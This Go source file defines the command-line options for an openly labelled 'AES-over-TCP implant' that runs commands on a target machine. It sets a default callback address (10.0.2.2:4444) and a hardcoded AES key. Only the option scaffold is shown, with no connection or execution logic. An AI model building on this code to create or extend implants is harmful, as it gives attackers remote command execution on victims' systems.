package cmd

import "github.com/spf13/cobra"

type CliOptions struct {

	// Port to connect to
	Port int

	// Address to connect to
	Address string

	// Enable debug trace
	DebugEnabled bool

	// AES-key to use for communications
	AesKey string
}

func CliDefaults() *CliOptions {

	return &CliOptions{
		Port:         4444,
		Address:      "10.0.2.2",
		DebugEnabled: false,
		AesKey:       "RAZINrazinRAZINrazinRAZINrazinRAZINraz",
	}
}

func LoadServerCLI(opts *CliOptions) *cobra.Command {

	version := "0.0.1"
	var cmd = &cobra.Command{
		Use:                "implant",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AES-over-TCP implant",
		Long:               "Executes commands on a target machine & communicates with AES",
		Run: func(cmd *cobra.Command, args []string) {

		},
	}

	defaults := CliDefaults()

	cmd.PersistentFlags().BoolVarP(&defaults.DebugEnabled, "debug", "d", false, "enable debug trace")
	cmd.PersistentFlags().IntVarP(&defaults.Port, "port", "p", 4444, "callback port")
	cmd.PersistentFlags().StringVarP(&defaults.Address, "address", "a", defaults.Address, "callback address")
	cmd.PersistentFlags().StringVarP(&defaults.AesKey, "key", "k", defaults.AesKey, "default AES key for communications")

	return cmd
}
